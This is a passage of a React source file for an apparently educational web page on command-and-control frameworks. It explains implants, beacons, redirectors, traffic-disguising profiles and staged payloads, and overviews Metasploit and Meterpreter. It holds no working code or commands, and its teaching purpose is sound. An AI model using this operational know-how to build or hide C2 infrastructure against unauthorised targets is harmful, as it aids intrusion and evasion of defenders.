                  </Box>
                </Box>
              </Grid>
            </Grid>

            <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
              <strong>Command and Control (C2)</strong> frameworks are the tools that make all of this possible. Think of 
              them like a "remote control center" for security testing. The framework consists of two main parts:
            </Typography>

            <Grid container spacing={3} sx={{ mb: 3 }}>
              <Grid item xs={12} md={6}>
                <Card sx={{ p: 2, height: "100%", border: `2px solid ${alpha("#dc2626", 0.2)}` }}>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                    <StorageIcon sx={{ color: "#dc2626" }} />
                    <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>The Server (Your Control Center)</Typography>
                  </Box>
                  <Typography variant="body2" color="text.secondary">
                    This runs on your infrastructure. It's like mission control - you use it to send commands, receive 
                    data, and manage all your operations. Multiple team members can connect to collaborate.
                  </Typography>
                </Card>
              </Grid>
              <Grid item xs={12} md={6}>
                <Card sx={{ p: 2, height: "100%", border: `2px solid ${alpha("#3b82f6", 0.2)}` }}>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                    <BugReportIcon sx={{ color: "#3b82f6" }} />
                    <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>The Agent/Implant (On Target)</Typography>
                  </Box>
                  <Typography variant="body2" color="text.secondary">
                    This is a small program that runs on the compromised system. It "phones home" to your server 
                    periodically, checks for commands to execute, and sends back results. Also called a "beacon" or "implant".
                  </Typography>
                </Card>
              </Grid>
            </Grid>

            <Divider sx={{ my: 3 }} />

            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              A Simple Analogy: The Spy Phone
            </Typography>
            <Typography variant="body1" sx={{ mb: 2, lineHeight: 1.8 }}>
              Think of C2 like a spy's secret phone. The spy (implant) is working undercover in enemy territory 
              (the target network). Periodically, the spy calls headquarters (the C2 server) using an encrypted 
              line (C2 protocol) to:
            </Typography>
            <List dense>
              <ListItem>
                <ListItemIcon><CheckCircleIcon sx={{ color: "success.main", fontSize: 18 }} /></ListItemIcon>
                <ListItemText 
                  primary="Check for new instructions (commands to execute)"
                  primaryTypographyProps={{ variant: "body2" }}
                />
              </ListItem>
              <ListItem>
                <ListItemIcon><CheckCircleIcon sx={{ color: "success.main", fontSize: 18 }} /></ListItemIcon>
                <ListItemText 
                  primary="Report what they've discovered (data exfiltration)"
                  primaryTypographyProps={{ variant: "body2" }}
                />
              </ListItem>
              <ListItem>
                <ListItemIcon><CheckCircleIcon sx={{ color: "success.main", fontSize: 18 }} /></ListItemIcon>
                <ListItemText 
                  primary="Request resources they need (upload tools)"
                  primaryTypographyProps={{ variant: "body2" }}
                />
              </ListItem>
              <ListItem>
                <ListItemIcon><CheckCircleIcon sx={{ color: "success.main", fontSize: 18 }} /></ListItemIcon>
                <ListItemText 
                  primary="Confirm they're still active (heartbeat)"
                  primaryTypographyProps={{ variant: "body2" }}
                />
              </ListItem>
            </List>

            <Alert severity="info" sx={{ mt: 2 }}>
              <AlertTitle>Why Do Security Professionals Need This?</AlertTitle>
              Real attackers use C2 frameworks. To test if an organization can detect and stop actual threats, 
              red teams need to simulate realistic attack scenarios using the same types of tools. This helps 
              identify gaps in defenses before real attackers exploit them.
            </Alert>
          </Paper>

          {/* How C2 Communication Works */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 3 }}>
              How C2 Communication Works
            </Typography>
            
            <Stepper orientation="vertical" sx={{ mb: 3 }}>
              <Step active>
                <StepLabel>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Initial Compromise</Typography>
                </StepLabel>
                <StepContent>
                  <Typography variant="body2" color="text.secondary">
                    The attacker gains initial access (phishing, exploit, etc.) and deploys the implant/agent on the target system.
                    This could be through a malicious document, drive-by download, or exploiting a vulnerability.
                  </Typography>
                </StepContent>
              </Step>
              <Step active>
                <StepLabel>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Beacon Callback</Typography>
                </StepLabel>
                <StepContent>
                  <Typography variant="body2" color="text.secondary">
                    The implant "phones home" to the C2 server. This first callback registers the compromised host with the 
                    server and provides basic information (hostname, username, OS, privileges). The implant then enters a 
                    sleep/beacon cycle.
                  </Typography>
                </StepContent>
              </Step>
              <Step active>
                <StepLabel>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Command & Response Loop</Typography>
                </StepLabel>
                <StepContent>
                  <Typography variant="body2" color="text.secondary">
                    Periodically, the implant wakes up and checks in with the server. If the operator has queued 
                    commands (run whoami, list files, etc.), the implant downloads and executes them. Results are 
                    sent back to the server on the next check-in.
                  </Typography>
                </StepContent>
              </Step>
              <Step active>
                <StepLabel>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>Post-Exploitation</Typography>
                </StepLabel>
                <StepContent>
                  <Typography variant="body2" color="text.secondary">
                    Operators use the C2 connection to conduct further actions: privilege escalation, credential 
                    harvesting, lateral movement to other systems, and data collection. Each action is executed 
                    through the established C2 channel.
                  </Typography>
                </StepContent>
              </Step>
            </Stepper>

            <CodeBlock>{`# Simplified C2 Communication Flow

┌─────────────┐                           ┌─────────────┐
│   Implant   │   1. Beacon (check-in)    │  C2 Server  │
│  (Target)   │ ─────────────────────────>│  (Attacker) │
│             │                           │             │
│             │   2. Commands (if any)    │             │
│             │ <─────────────────────────│             │
│             │                           │             │
│             │   3. Execute commands     │             │
│             │        locally            │             │
│             │                           │             │
│             │   4. Results on next      │             │
│             │      check-in             │             │
│             │ ─────────────────────────>│             │
└─────────────┘                           └─────────────┘

Timeline:
[Sleep] → [Wake] → [Beacon] → [Get Tasks] → [Execute] → [Sleep]...`}</CodeBlock>
          </Paper>

          {/* Key Concepts */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Key Concepts You Need to Know
            </Typography>
            <Grid container spacing={2}>
              {[
                { 
                  term: "Beacon/Implant/Agent", 
                  definition: "The malware that runs on the target system. It 'beacons' (calls) back to the C2 server periodically.",
                  icon: <BugReportIcon />,
                  color: "#3b82f6"
                },
                { 
                  term: "Team Server", 
                  definition: "The central server where operators connect to manage operations. Never expose directly to the internet.",
                  icon: <StorageIcon />,
                  color: "#dc2626"
                },
                { 
                  term: "Listener", 
                  definition: "A service on the C2 server that waits for implant connections. Different listeners for different protocols (HTTP, DNS, etc.).",
                  icon: <NetworkCheckIcon />,
                  color: "#10b981"
                },
                { 
                  term: "Sleep/Jitter", 
                  definition: "How long the implant waits between check-ins (sleep) and the randomness added to avoid patterns (jitter).",
                  icon: <TimelineIcon />,
                  color: "#f59e0b"
                },
                { 
                  term: "Redirector", 
                  definition: "A proxy server that hides your real C2 server. If detected, burn the redirector, not your infrastructure.",
                  icon: <AccountTreeIcon />,
                  color: "#8b5cf6"
                },
                { 
                  term: "Malleable Profile", 
                  definition: "Configuration that customizes how C2 traffic looks. Makes your traffic mimic legitimate applications.",
                  icon: <PsychologyIcon />,
                  color: "#ec4899"
                },
                { 
                  term: "Staging", 
                  definition: "Delivering the implant in stages. First a small 'stager' downloads the full implant. Helps avoid detection.",
                  icon: <TrendingUpIcon />,
                  color: "#14b8a6"
                },
                { 
                  term: "Pivoting", 
                  definition: "Using a compromised host to reach other internal systems that aren't directly accessible from outside.",
                  icon: <SyncAltIcon />,
                  color: "#f97316"
                },
              ].map((item) => (
                <Grid item xs={12} md={6} key={item.term}>
                  <Card sx={{ p: 2, height: "100%" }}>
                    <Box sx={{ display: "flex", alignItems: "center", gap: 1.5, mb: 1 }}>
                      <Box sx={{ color: item.color }}>{item.icon}</Box>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{item.term}</Typography>
                    </Box>
                    <Typography variant="body2" color="text.secondary">{item.definition}</Typography>
                  </Card>
                </Grid>
              ))}
            </Grid>
          </Paper>

          {/* C2 Architecture */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              C2 Architecture Components
            </Typography>
            <Typography variant="body2" color="text.secondary" sx={{ mb: 3 }}>
              A professional red team operation uses layered infrastructure for protection and flexibility.
            </Typography>
            <Grid container spacing={2}>
              {[
                { name: "Team Server", desc: "Central management server for operators - your command center", icon: <StorageIcon />, color: "#dc2626" },
                { name: "Implant/Agent", desc: "Payload running on compromised host - your eyes and hands", icon: <BugReportIcon />, color: "#3b82f6" },
                { name: "Listener", desc: "Service waiting for implant connections on specific ports/protocols", icon: <NetworkCheckIcon />, color: "#10b981" },
                { name: "Redirector", desc: "Proxy to hide team server location - expendable front-line", icon: <AccountTreeIcon />, color: "#8b5cf6" },
                { name: "Payload Staging", desc: "Serves initial payloads/stagers - short-lived, separate infra", icon: <CodeIcon />, color: "#f59e0b" },
                { name: "Operator Client", desc: "Your interface to the team server - GUI or command line", icon: <ComputerIcon />, color: "#ec4899" },
              ].map((item) => (
                <Grid item xs={6} md={4} key={item.name}>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1.5 }}>
                    <Box sx={{ color: item.color }}>{item.icon}</Box>
                    <Box>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{item.name}</Typography>
                      <Typography variant="caption" color="text.secondary">{item.desc}</Typography>
                    </Box>
                  </Box>
                </Grid>
              ))}
            </Grid>
          </Paper>

          {/* MITRE ATT&CK Mapping */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              MITRE ATT&CK Mapping
            </Typography>
            <Typography variant="body2" color="text.secondary" sx={{ mb: 2 }}>
              C2 frameworks implement techniques across multiple ATT&CK tactics. Understanding this helps with both offense and defense.
            </Typography>
            {mitreAttackMappings.map((tactic, idx) => (
              <Accordion key={idx} defaultExpanded={idx === 0}>
                <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                  <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>{tactic.tactic}</Typography>
                </AccordionSummary>
                <AccordionDetails>
                  <Grid container spacing={1}>
                    {tactic.techniques.map((tech, tidx) => (
                      <Grid item xs={12} sm={6} md={4} key={tidx}>
                        <Chip 
                          label={`${tech.id}: ${tech.name}`} 
                          size="small" 
                          variant="outlined"
                          sx={{ m: 0.25 }}
                        />
                        {tech.subtechniques.length > 0 && (
                          <Typography variant="caption" color="text.secondary" sx={{ display: "block", ml: 1 }}>
                            └ {tech.subtechniques.join(", ")}
                          </Typography>
                        )}
                      </Grid>
                    ))}
                  </Grid>
                </AccordionDetails>
              </Accordion>
            ))}
          </Paper>

          {/* Why C2 Matters */}
          <Paper sx={{ p: 3, borderRadius: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
              Why C2 Frameworks Matter
            </Typography>
            <Grid container spacing={2}>
              <Grid item xs={12} md={6}>
                <Card sx={{ p: 2, height: "100%", bgcolor: alpha("#dc2626", 0.05) }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#dc2626", mb: 1 }}>
                    For Red Teams (Offense)
                  </Typography>
                  <List dense>
                    {[
                      "Simulate real-world adversary behavior",
                      "Test detection and response capabilities",
                      "Demonstrate actual risk to stakeholders",
                      "Validate security control effectiveness",
                      "Conduct realistic adversary emulation",
                    ].map((item, i) => (
                      <ListItem key={i} sx={{ py: 0.25 }}>
                        <ListItemIcon sx={{ minWidth: 24 }}>
                          <TerminalIcon sx={{ fontSize: 14, color: "#dc2626" }} />
                        </ListItemIcon>
                        <ListItemText primary={item} primaryTypographyProps={{ variant: "body2" }} />
                      </ListItem>
                    ))}
                  </List>
                </Card>
              </Grid>
              <Grid item xs={12} md={6}>
                <Card sx={{ p: 2, height: "100%", bgcolor: alpha("#3b82f6", 0.05) }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#3b82f6", mb: 1 }}>
                    For Blue Teams (Defense)
                  </Typography>
                  <List dense>
                    {[
                      "Understand attacker techniques to build detections",
                      "Test security tools against known C2 traffic",
                      "Develop behavioral detection strategies",
                      "Train SOC analysts on realistic scenarios",
                      "Validate incident response procedures",
                    ].map((item, i) => (
                      <ListItem key={i} sx={{ py: 0.25 }}>
                        <ListItemIcon sx={{ minWidth: 24 }}>
                          <ShieldIcon sx={{ fontSize: 14, color: "#3b82f6" }} />
                        </ListItemIcon>
                        <ListItemText primary={item} primaryTypographyProps={{ variant: "body2" }} />
                      </ListItem>
                    ))}
                  </List>
                </Card>
              </Grid>
            </Grid>
          </Paper>
        </Box>

      {/* Section: Frameworks */}
      <Box id="frameworks" sx={{ display: "flex", flexDirection: "column", gap: 3, mt: 4, scrollMarginTop: 80 }}>
        <Typography variant="h4" sx={{ fontWeight: 800, mb: 1, display: "flex", alignItems: "center", gap: 2 }}>
          <BuildIcon sx={{ color: accent }} />
          Frameworks
        </Typography>
        <Alert severity="info" sx={{ borderRadius: 2 }}>
          <AlertTitle>Choosing a C2 Framework</AlertTitle>
          Consider your operation's requirements: stealth level, target OS, team collaboration, and budget.
          Many teams use multiple frameworks for different scenarios. Start with Sliver for learning - it's free,
          modern, and has excellent documentation.
        </Alert>

          {c2Frameworks.map((fw, idx) => {
            const fwId = `fw-${fw.name.toLowerCase().replace(/[\s\/]+/g, '-').replace(/[^a-z0-9-]/g, '')}`;
            return (
            <Accordion key={idx} defaultExpanded={idx === 0} id={fwId} sx={{ scrollMarginTop: 80 }}>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 2, width: "100%" }}>
                  <SettingsRemoteIcon sx={{ color: fw.type === "Commercial" ? "#f59e0b" : "#10b981" }} />
                  <Box sx={{ flex: 1 }}>
                    <Typography variant="h6" sx={{ fontWeight: 700 }}>{fw.name}</Typography>
                    <Typography variant="body2" color="text.secondary">{fw.description}</Typography>
                  </Box>
                  <Box sx={{ display: "flex", gap: 1 }}>
                    <Chip label={fw.type} size="small" sx={{ bgcolor: alpha(fw.type === "Commercial" ? "#f59e0b" : "#10b981", 0.1), color: fw.type === "Commercial" ? "#f59e0b" : "#10b981" }} />
                    <Chip label={fw.difficulty} size="small" variant="outlined" />
                  </Box>
                </Box>
              </AccordionSummary>
              <AccordionDetails>
                {/* Extended description */}
                {fw.longDescription && (
                  <Alert severity="info" icon={<LightbulbIcon />} sx={{ mb: 2 }}>
                    <Typography variant="body2">{fw.longDescription}</Typography>
                  </Alert>
                )}
                
                <Grid container spacing={3}>
                  <Grid item xs={12} md={4}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Key Features</Typography>
                    <List dense>
                      {fw.features.map((f, i) => (
                        <ListItem key={i} sx={{ py: 0.25 }}>
                          <ListItemIcon sx={{ minWidth: 24 }}>
                            <CheckCircleIcon sx={{ fontSize: 14, color: "success.main" }} />
                          </ListItemIcon>
                          <ListItemText primary={f} primaryTypographyProps={{ variant: "body2" }} />
                        </ListItem>
                      ))}
                    </List>
                  </Grid>
                  <Grid item xs={12} md={4}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Supported Protocols</Typography>
                    <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5 }}>
                      {fw.protocols.map((p, i) => (
                        <Chip key={i} label={p} size="small" variant="outlined" />
                      ))}
                    </Box>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mt: 2, mb: 1 }}>Primary Language</Typography>
                    <Typography variant="body2">{fw.language}</Typography>
                  </Grid>
                  <Grid item xs={12} md={4}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Cost</Typography>
                    <Typography variant="body2" sx={{ mb: 2 }}>{fw.cost}</Typography>
                    <Typography
                      component="a"
                      href={fw.url}
                      target="_blank"
                      rel="noopener"
                      sx={{ color: "primary.main", textDecoration: "none", "&:hover": { textDecoration: "underline" } }}
                    >
                      Documentation →
                    </Typography>
                  </Grid>

                  {/* Use Cases */}
                  {fw.useCases && fw.useCases.length > 0 && (
                    <Grid item xs={12} md={6}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "success.main" }}>
                        <CheckCircleIcon sx={{ fontSize: 16, mr: 0.5, verticalAlign: "middle" }} />
                        Best Used For
                      </Typography>
                      <List dense>
                        {fw.useCases.map((uc, i) => (
                          <ListItem key={i} sx={{ py: 0.25 }}>
                            <ListItemText primary={`• ${uc}`} primaryTypographyProps={{ variant: "body2", color: "text.secondary" }} />
                          </ListItem>
                        ))}
                      </List>
                    </Grid>
                  )}

                  {/* Limitations */}
                  {fw.limitations && fw.limitations.length > 0 && (
                    <Grid item xs={12} md={6}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "warning.main" }}>
                        <WarningIcon sx={{ fontSize: 16, mr: 0.5, verticalAlign: "middle" }} />
                        Limitations
                      </Typography>
                      <List dense>
                        {fw.limitations.map((lim, i) => (
                          <ListItem key={i} sx={{ py: 0.25 }}>
                            <ListItemText primary={`• ${lim}`} primaryTypographyProps={{ variant: "body2", color: "text.secondary" }} />
                          </ListItem>
                        ))}
                      </List>
                    </Grid>
                  )}

                  {/* Deep Dive Content - Detailed Technical Information */}
                  {fw.deepDiveContent && (
                    <Grid item xs={12}>
                      <Divider sx={{ my: 3 }} />
                      <Accordion 
                        sx={{ 
                          bgcolor: alpha(accent, 0.03), 
                          border: `1px solid ${alpha(accent, 0.2)}`,
                          '&:before': { display: 'none' }
                        }}
                      >
                        <AccordionSummary 
                          expandIcon={<ExpandMoreIcon />}
                          sx={{ 
                            bgcolor: alpha(accent, 0.05),
                            '&:hover': { bgcolor: alpha(accent, 0.08) }
                          }}
                        >
                          <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                            <SchoolIcon sx={{ color: accent }} />
                            <Typography variant="h6" sx={{ fontWeight: 700 }}>
                              📚 Deep Dive: {fw.name} Technical Guide
                            </Typography>
                          </Box>
                        </AccordionSummary>
                        <AccordionDetails sx={{ p: 3 }}>
                          {/* Render the deep dive content with proper formatting */}
                          <Box sx={{ 
                            '& h2': { 
                              fontSize: '1.3rem', 
                              fontWeight: 700, 
                              mt: 3, 
                              mb: 2, 
                              color: accent,
                              borderBottom: `2px solid ${alpha(accent, 0.3)}`,
                              pb: 1 
                            },
                            '& h3': { 
                              fontSize: '1.1rem', 
                              fontWeight: 600, 
                              mt: 2, 
                              mb: 1.5,
                              color: 'text.primary'
                            },
                            '& p': { 
                              mb: 1.5, 
                              lineHeight: 1.7,
                              color: 'text.secondary'
                            },
                            '& pre': { 
                              bgcolor: '#1e1e1e', 
                              color: '#d4d4d4', 
                              p: 2, 
                              borderRadius: 1, 
                              overflow: 'auto',
                              fontSize: '0.8rem',
                              mb: 2,
                              border: '1px solid rgba(255,255,255,0.1)'
                            },
                            '& code': {
                              bgcolor: alpha(accent, 0.1),
                              px: 0.5,
                              borderRadius: 0.5,
                              fontFamily: 'monospace',
                              fontSize: '0.85em'
                            },
                            '& ul, & ol': { 
                              pl: 3, 
                              mb: 2 
                            },
                            '& li': { 
                              mb: 0.5,
                              color: 'text.secondary'
                            },
                            '& table': {
                              width: '100%',
                              borderCollapse: 'collapse',
                              mb: 2,
                              '& th, & td': {
                                border: '1px solid',
                                borderColor: 'divider',
                                p: 1,
                                textAlign: 'left',
                                fontSize: '0.85rem'
                              },
                              '& th': {
                                bgcolor: alpha(accent, 0.1),
                                fontWeight: 600
                              }
                            },
                            '& hr': {
                              my: 3,
                              borderColor: 'divider'
                            }
                          }}>
                            {/* Split content by sections and render */}
                            {fw.deepDiveContent.split('\n').map((line, lineIdx) => {
                              // Headers
                              if (line.startsWith('## ')) {
                                return <Typography key={lineIdx} component="h2" sx={{ fontSize: '1.3rem', fontWeight: 700, mt: 3, mb: 2, color: accent, borderBottom: `2px solid ${alpha(accent, 0.3)}`, pb: 1 }}>{line.replace('## ', '')}</Typography>;
                              }
                              if (line.startsWith('### ')) {
                                return <Typography key={lineIdx} component="h3" sx={{ fontSize: '1.1rem', fontWeight: 600, mt: 2, mb: 1.5 }}>{line.replace('### ', '')}</Typography>;
                              }
                              // Code blocks - detect start
                              if (line.trim().startsWith('```')) {
                                return null; // Skip code fence markers (handled by pre below)
                              }
                              // Tables - basic support
                              if (line.includes('|') && line.trim().startsWith('|')) {
                                const cells = line.split('|').filter(c => c.trim());
                                if (cells.length > 0 && !line.includes('---')) {
                                  return (
                                    <Box key={lineIdx} sx={{ display: 'flex', borderBottom: '1px solid', borderColor: 'divider' }}>
                                      {cells.map((cell, cellIdx) => (
                                        <Box key={cellIdx} sx={{ flex: 1, p: 1, fontSize: '0.85rem', bgcolor: lineIdx < 3 ? alpha(accent, 0.05) : 'transparent' }}>
                                          {cell.trim()}
                                        </Box>
                                      ))}
                                    </Box>
                                  );
                                }
                                return null;
                              }
                              // Regular paragraphs (non-empty lines that aren't special)
                              if (line.trim() && !line.trim().startsWith('-') && !line.trim().startsWith('*') && !line.trim().startsWith('#')) {
                                // Check if it's part of a code block by looking for surrounding context
                                return <Typography key={lineIdx} variant="body2" sx={{ mb: 1, lineHeight: 1.7, color: 'text.secondary' }}>{line}</Typography>;
                              }
                              // List items
                              if (line.trim().startsWith('- ') || line.trim().startsWith('* ')) {
                                return (
                                  <Box key={lineIdx} sx={{ display: 'flex', alignItems: 'flex-start', mb: 0.5, pl: 2 }}>
                                    <Typography sx={{ mr: 1, color: accent }}>•</Typography>
                                    <Typography variant="body2" color="text.secondary">{line.replace(/^[\s]*[-*]\s*/, '')}</Typography>
                                  </Box>
                                );
                              }
                              // Numbered lists
                              if (/^\d+\./.test(line.trim())) {
                                return (
                                  <Box key={lineIdx} sx={{ display: 'flex', alignItems: 'flex-start', mb: 0.5, pl: 2 }}>
                                    <Typography variant="body2" color="text.secondary">{line}</Typography>
                                  </Box>
                                );
                              }
                              return null;
                            })}
                          </Box>

                          {/* Version History */}
                          {fw.versionHistory && fw.versionHistory.length > 0 && (
                            <Box sx={{ mt: 4 }}>
                              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: 'flex', alignItems: 'center', gap: 1 }}>
                                <HistoryIcon sx={{ color: accent }} />
                                Version History
                              </Typography>
                              <Box sx={{ display: 'flex', flexWrap: 'wrap', gap: 2 }}>
                                {fw.versionHistory.map((vh, vhIdx) => (
                                  <Paper key={vhIdx} sx={{ p: 2, minWidth: 200, bgcolor: alpha(accent, 0.05), border: `1px solid ${alpha(accent, 0.2)}` }}>
                                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: accent }}>{vh.version}</Typography>
                                    <Typography variant="caption" color="text.secondary" sx={{ display: 'block', mb: 0.5 }}>{vh.date}</Typography>
                                    <Typography variant="body2" color="text.secondary">{vh.highlights}</Typography>
                                  </Paper>
                                ))}
                              </Box>
                            </Box>
                          )}

                          {/* Community Resources */}
                          {fw.communityResources && fw.communityResources.length > 0 && (
                            <Box sx={{ mt: 4 }}>
                              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: 'flex', alignItems: 'center', gap: 1 }}>
                                <GroupsIcon sx={{ color: accent }} />
                                Community & Resources
                              </Typography>
                              <Box sx={{ display: 'flex', flexWrap: 'wrap', gap: 1 }}>
                                {fw.communityResources.map((cr, crIdx) => (
                                  <Chip key={crIdx} label={cr} variant="outlined" size="small" sx={{ borderColor: alpha(accent, 0.3) }} />
                                ))}
                              </Box>
                            </Box>
                          )}
                        </AccordionDetails>
                      </Accordion>
                    </Grid>
                  )}

                  {/* Extended Metasploit Content */}
                  {fw.extendedContent && fw.name === "Metasploit Framework" && (
                    <Grid item xs={12}>
                      <Divider sx={{ my: 3 }} />
                      
                      {/* Architecture Overview */}
                      <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                        <AccountTreeIcon sx={{ color: accent }} />
                        Metasploit Architecture
                      </Typography>
                      <Grid container spacing={2} sx={{ mb: 3 }}>
                        <Grid item xs={12} md={4}>
                          <Paper sx={{ p: 2, bgcolor: alpha(accent, 0.05), border: `1px solid ${alpha(accent, 0.2)}` }}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, color: accent, mb: 1 }}>msfconsole</Typography>
                            <Typography variant="body2" color="text.secondary">
                              The primary CLI interface for interacting with Metasploit. Provides access to all modules, session management, and framework configuration. Supports tab completion, history, and resource scripts.
                            </Typography>
                          </Paper>
                        </Grid>
                        <Grid item xs={12} md={4}>
                          <Paper sx={{ p: 2, bgcolor: alpha("#10b981", 0.05), border: `1px solid ${alpha("#10b981", 0.2)}` }}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#10b981", mb: 1 }}>msfvenom</Typography>
                            <Typography variant="body2" color="text.secondary">
                              Standalone payload generator combining msfpayload and msfencode. Creates custom payloads in various formats (exe, dll, elf, raw, etc.) with encoder support for basic evasion.
                            </Typography>
                          </Paper>
                        </Grid>
                        <Grid item xs={12} md={4}>
                          <Paper sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), border: `1px solid ${alpha("#f59e0b", 0.2)}` }}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f59e0b", mb: 1 }}>Database Backend</Typography>
                            <Typography variant="body2" color="text.secondary">
                              PostgreSQL database stores hosts, services, credentials, and loot. Enables data organization across engagements and supports workspaces for project separation.
                            </Typography>
                          </Paper>
                        </Grid>
                      </Grid>

                      {/* Module Types */}
                      <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                        <CodeIcon sx={{ color: accent }} />
                        Module Types
                      </Typography>
                      <Grid container spacing={2} sx={{ mb: 3 }}>
                        <Grid item xs={12} md={6}>
                          <Paper sx={{ p: 2 }}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#ef4444" }}>
                              <BugReportIcon sx={{ fontSize: 16, mr: 0.5, verticalAlign: "middle" }} />
                              Exploit Modules (~2,500+)
                            </Typography>
                            <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
                              Code that takes advantage of vulnerabilities to deliver payloads. Organized by platform and service.
                            </Typography>
                            <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5 }}>
                              {["Windows SMB", "Linux Local", "Web Apps", "Remote Code Exec", "Browser Exploits", "Mobile"].map((t) => (
                                <Chip key={t} label={t} size="small" variant="outlined" sx={{ fontSize: "0.7rem" }} />
                              ))}
                            </Box>
                          </Paper>
                        </Grid>
                        <Grid item xs={12} md={6}>
                          <Paper sx={{ p: 2 }}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#3b82f6" }}>
                              <NetworkCheckIcon sx={{ fontSize: 16, mr: 0.5, verticalAlign: "middle" }} />
                              Auxiliary Modules (~1,100+)
                            </Typography>
                            <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
                              Scanning, fuzzing, and information gathering without exploitation. Essential for reconnaissance.
                            </Typography>
                            <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5 }}>
                              {["Port Scanners", "Service Enum", "Credential Testing", "Fuzzers", "DoS", "Sniffers"].map((t) => (
                                <Chip key={t} label={t} size="small" variant="outlined" sx={{ fontSize: "0.7rem" }} />
                              ))}
                            </Box>
                          </Paper>
                        </Grid>
                        <Grid item xs={12} md={6}>
                          <Paper sx={{ p: 2 }}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#10b981" }}>
                              <MemoryIcon sx={{ fontSize: 16, mr: 0.5, verticalAlign: "middle" }} />
                              Post-Exploitation Modules (~600+)
                            </Typography>
                            <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
                              Actions performed after gaining access. Credential harvesting, persistence, lateral movement.
                            </Typography>
                            <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5 }}>
                              {["Credential Dump", "Keylogging", "Screenshots", "Persistence", "Pivoting", "AD Attacks"].map((t) => (
                                <Chip key={t} label={t} size="small" variant="outlined" sx={{ fontSize: "0.7rem" }} />
                              ))}
                            </Box>
                          </Paper>
                        </Grid>
                        <Grid item xs={12} md={6}>
                          <Paper sx={{ p: 2 }}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f59e0b" }}>
                              <VpnKeyIcon sx={{ fontSize: 16, mr: 0.5, verticalAlign: "middle" }} />
                              Payload Modules (~500+)
                            </Typography>
                            <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
                              Code that runs on the target after successful exploitation. Ranges from simple shells to advanced Meterpreter.
                            </Typography>
                            <Box sx={{ display: "flex", flexWrap: "wrap", gap: 0.5 }}>
                              {["Meterpreter", "Reverse Shells", "Bind Shells", "Staged", "Stageless", "Web Shells"].map((t) => (
                                <Chip key={t} label={t} size="small" variant="outlined" sx={{ fontSize: "0.7rem" }} />
                              ))}
                            </Box>
                          </Paper>
                        </Grid>
                      </Grid>

                      {/* Meterpreter Deep Dive */}
                      <Alert severity="warning" sx={{ mb: 2, borderRadius: 2 }}>
                        <AlertTitle sx={{ fontWeight: 700 }}>🔥 Meterpreter (Meta-Interpreter) - The Crown Jewel</AlertTitle>
                        <Typography variant="body2">
                          Meterpreter is Metasploit's most powerful payload - an advanced, dynamically extensible payload that operates entirely in memory, leaving minimal forensic footprint. It's the foundation for understanding modern C2 implants.
                        </Typography>
                      </Alert>

                      <Grid container spacing={2} sx={{ mb: 3 }}>
                        <Grid item xs={12} md={6}>
                          <Paper sx={{ p: 2, bgcolor: alpha("#8b5cf6", 0.05), border: `1px solid ${alpha("#8b5cf6", 0.2)}` }}>
                            <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#8b5cf6", mb: 1 }}>
                              Meterpreter Architecture
                            </Typography>
                            <List dense>
                              {[
